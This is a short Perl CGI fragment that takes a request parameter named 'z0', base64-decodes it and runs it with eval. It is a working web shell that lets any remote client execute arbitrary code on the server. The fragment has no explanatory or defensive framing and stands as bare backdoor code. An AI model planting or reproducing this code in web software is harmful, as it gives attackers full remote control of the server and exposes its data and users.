use MIME::Base64;

my $q = CGI->new;
my $z0_param = $q->param('z0') // '';
eval(decode_base64($z0_param));